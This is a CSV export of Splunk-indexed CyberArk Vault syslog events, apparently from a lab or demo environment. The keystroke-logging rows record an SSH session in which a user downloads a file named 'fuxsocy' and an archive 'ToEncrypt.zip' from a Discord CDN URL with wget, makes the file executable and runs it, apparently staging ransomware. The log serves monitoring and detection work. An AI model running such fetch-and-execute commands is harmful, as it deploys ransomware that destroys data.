Date,"_raw","_time",act,app,cn1Label,cn2,cn2Label,cs1Label,cs2,cs2Label,cs3,cs3Label,cs4Label,cs5Label,"date_hour","date_mday","date_minute","date_month","date_second","date_wday","date_year","date_zone",dhost,duser,eventtype,externalId,fname,host,index,linecount,msg,punct,reason,shost,source,sourcetype,"splunk_server",suser,timeendpos,timestartpos
,"Jun 10 11:55:26 184.170.232.53 1 2020-06-10T09:55:26Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|361|Keystroke logging|5|act=""Keystroke logging"" suser=ivar fname=Root\Operating System-UnixSSH-rhel7.cybr.com-logon dvc= shost=10.0.0.15 dhost=rhel7.cybr.com duser=logon externalId=93120b1b-0bf6-46f4-b9cd-252378e02583 app=SSH reason=wget https://cdn.discordapp.com/attachments/559676586941743114/720213401707741194/fuxsocy cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""Linux Accounts"" cs3Label=""Device Type"" cs3=""Operating System"" cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:26.000+0200","Keystroke logging",SSH,"Request Id",,"Ticket Id","Affected User Name","Linux Accounts","Safe Name","Operating System","Device Type",Database,"Other info",11,10,55,june,26,wednesday,2020,local,"rhel7.cybr.com",logon,Syslog,"93120b1b-0bf6-46f4-b9cd-252378e02583","Root\Operating","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\_--..-_=_=...",wget,"10.0.0.15","udp:514",syslog,london,ivar,15,0
,"Jun 10 11:55:27 184.170.232.53 1 2020-06-10T09:55:26Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|361|Keystroke logging|5|act=""Keystroke logging"" suser=ivar fname=Root\Operating System-UnixSSH-rhel7.cybr.com-logon dvc= shost=10.0.0.15 dhost=rhel7.cybr.com duser=logon externalId=93120b1b-0bf6-46f4-b9cd-252378e02583 app=SSH reason=chmod +x fuxsocy cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""Linux Accounts"" cs3Label=""Device Type"" cs3=""Operating System"" cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:27.000+0200","Keystroke logging",SSH,"Request Id",,"Ticket Id","Affected User Name","Linux Accounts","Safe Name","Operating System","Device Type",Database,"Other info",11,10,55,june,27,wednesday,2020,local,"rhel7.cybr.com",logon,Syslog,"93120b1b-0bf6-46f4-b9cd-252378e02583","Root\Operating","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\_--..-_=_=...",chmod,"10.0.0.15","udp:514",syslog,london,ivar,15,0
,"Jun 10 11:55:27 184.170.232.53 1 2020-06-10T09:55:26Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|361|Keystroke logging|5|act=""Keystroke logging"" suser=ivar fname=Root\Operating System-UnixSSH-rhel7.cybr.com-logon dvc= shost=10.0.0.15 dhost=rhel7.cybr.com duser=logon externalId=93120b1b-0bf6-46f4-b9cd-252378e02583 app=SSH reason=wget https://cdn.discordapp.com/attachments/559676586941743114/720205016123572324/ToEncrypt.zip cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""Linux Accounts"" cs3Label=""Device Type"" cs3=""Operating System"" cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:27.000+0200","Keystroke logging",SSH,"Request Id",,"Ticket Id","Affected User Name","Linux Accounts","Safe Name","Operating System","Device Type",Database,"Other info",11,10,55,june,27,wednesday,2020,local,"rhel7.cybr.com",logon,Syslog,"93120b1b-0bf6-46f4-b9cd-252378e02583","Root\Operating","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\_--..-_=_=...",wget,"10.0.0.15","udp:514",syslog,london,ivar,15,0
,"Jun 10 11:55:27 184.170.232.53 1 2020-06-10T09:55:26Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|361|Keystroke logging|5|act=""Keystroke logging"" suser=ivar fname=Root\Operating System-UnixSSH-rhel7.cybr.com-logon dvc= shost=10.0.0.15 dhost=rhel7.cybr.com duser=logon externalId=93120b1b-0bf6-46f4-b9cd-252378e02583 app=SSH reason=unzip ToEncrypt.zip cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""Linux Accounts"" cs3Label=""Device Type"" cs3=""Operating System"" cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:27.000+0200","Keystroke logging",SSH,"Request Id",,"Ticket Id","Affected User Name","Linux Accounts","Safe Name","Operating System","Device Type",Database,"Other info",11,10,55,june,27,wednesday,2020,local,"rhel7.cybr.com",logon,Syslog,"93120b1b-0bf6-46f4-b9cd-252378e02583","Root\Operating","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\_--..-_=_=...",unzip,"10.0.0.15","udp:514",syslog,london,ivar,15,0
"[06/10/2020 09:52:01 AM UTC]","Jun 10 11:55:27 184.170.232.53 1 2020-06-10T09:55:27Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|461|Privileged Threat Analytics Event|5|act=""Privileged Threat Analytics Event"" suser=PTAAppUser fname= dvc= shost=10.0.0.40 dhost= duser= externalId= app= reason= cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2= cs3Label=""Device Type"" cs3= cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2=""Date\=[06/10/2020 09:52:01 AM UTC],EventN"" msg=""Date\=[06/10/2020 09:52:01 AM UTC],EventN"" reason=""""","2020-06-10T11:55:27.000+0200","Privileged Threat Analytics Event",,"Request Id","Date\=[06/10/2020 09:52:01 AM UTC],EventN","Ticket Id","Affected User Name",,"Safe Name",,"Device Type",Database,"Other info",11,10,55,june,27,wednesday,2020,local,,,Syslog,,,"184.170.232.53",main,,"Date\=[06/10/2020 09:52:01 AM UTC],EventN","__::_...__--::__:|-||..||___||=""___""_=_=_=_=..._=_","","10.0.0.40","udp:514",syslog,london,PTAAppUser,15,0
,"Jun 10 11:55:31 184.170.232.53 1 2020-06-10T09:55:31Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|51|Retrieve File|5|act=""Retrieve File"" suser=PSMApp_COMP01 fname=Root\Policies.xml dvc= shost=10.0.0.15 dhost= duser= externalId= app= reason= cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""PVWAConfig"" cs3Label=""Device Type"" cs3= cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:31.000+0200","Retrieve File",,"Request Id",,"Ticket Id","Affected User Name",PVWAConfig,"Safe Name",,"Device Type",Database,"Other info",11,10,55,june,31,wednesday,2020,local,,,Syslog,,"Root\Policies.xml","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\._=_=..._=_=_",,"10.0.0.15","udp:514",syslog,london,"PSMApp_COMP01",15,0
,"Jun 10 11:55:31 184.170.232.53 1 2020-06-10T09:55:31Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|51|Retrieve File|5|act=""Retrieve File"" suser=PSMApp_COMP01 fname=Root\PVConfiguration.xml dvc= shost=10.0.0.15 dhost= duser= externalId= app= reason= cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""PVWAConfig"" cs3Label=""Device Type"" cs3= cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:31.000+0200","Retrieve File",,"Request Id",,"Ticket Id","Affected User Name",PVWAConfig,"Safe Name",,"Device Type",Database,"Other info",11,10,55,june,31,wednesday,2020,local,,,Syslog,,"Root\PVConfiguration.xml","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\._=_=..._=_=_",,"10.0.0.15","udp:514",syslog,london,"PSMApp_COMP01",15,0
,"Jun 10 11:55:32 184.170.232.53 1 2020-06-10T09:55:32Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|361|Keystroke logging|5|act=""Keystroke logging"" suser=ivar fname=Root\Operating System-UnixSSH-rhel7.cybr.com-logon dvc= shost=10.0.0.15 dhost=rhel7.cybr.com duser=logon externalId=93120b1b-0bf6-46f4-b9cd-252378e02583 app=SSH reason=./fuxsocy cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""Linux Accounts"" cs3Label=""Device Type"" cs3=""Operating System"" cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:32.000+0200","Keystroke logging",SSH,"Request Id",,"Ticket Id","Affected User Name","Linux Accounts","Safe Name","Operating System","Device Type",Database,"Other info",11,10,55,june,32,wednesday,2020,local,"rhel7.cybr.com",logon,Syslog,"93120b1b-0bf6-46f4-b9cd-252378e02583","Root\Operating","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\_--..-_=_=...","./fuxsocy","10.0.0.15","udp:514",syslog,london,ivar,15,0
,"Jun 10 11:55:54 184.170.232.53 1 2020-06-10T09:55:54Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|51|Retrieve File|5|act=""Retrieve File"" suser=PasswordManager fname=Root\Policies\Policy-WindowsJustInTime.ini dvc= shost=10.0.0.15 dhost= duser= externalId= app= reason= cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""PasswordManagerShared"" cs3Label=""Device Type"" cs3= cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:54.000+0200","Retrieve File",,"Request Id",,"Ticket Id","Affected User Name",PasswordManagerShared,"Safe Name",,"Device Type",Database,"Other info",11,10,55,june,54,wednesday,2020,local,,,Syslog,,"Root\Policies\Policy-WindowsJustInTime.ini","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\\-._=_=..._=_",,"10.0.0.15","udp:514",syslog,london,PasswordManager,15,0
,"Jun 10 11:55:59 184.170.232.53 1 2020-06-10T09:55:59Z VLT01 CEF:0|Cyber-Ark|Vault|11.4.0000|361|Keystroke logging|5|act=""Keystroke logging"" suser=ivar fname=Root\Operating System-UnixSSH-rhel7.cybr.com-logon dvc= shost=10.0.0.15 dhost=rhel7.cybr.com duser=logon externalId=93120b1b-0bf6-46f4-b9cd-252378e02583 app=SSH reason=thanks cs1Label=""Affected User Name"" cs1= cs2Label=""Safe Name"" cs2=""Linux Accounts"" cs3Label=""Device Type"" cs3=""Operating System"" cs4Label=""Database"" cs4= cs5Label=""Other info"" cs5= cn1Label=""Request Id"" cn1= cn2Label=""Ticket Id"" cn2= msg= reason=","2020-06-10T11:55:59.000+0200","Keystroke logging",SSH,"Request Id",,"Ticket Id","Affected User Name","Linux Accounts","Safe Name","Operating System","Device Type",Database,"Other info",11,10,55,june,59,wednesday,2020,local,"rhel7.cybr.com",logon,Syslog,"93120b1b-0bf6-46f4-b9cd-252378e02583","Root\Operating","184.170.232.53",main,,,"__::_...__--::__:|-||..||_||=""_""_=_=\_--..-_=_=...",thanks,"10.0.0.15","udp:514",syslog,london,ivar,15,0
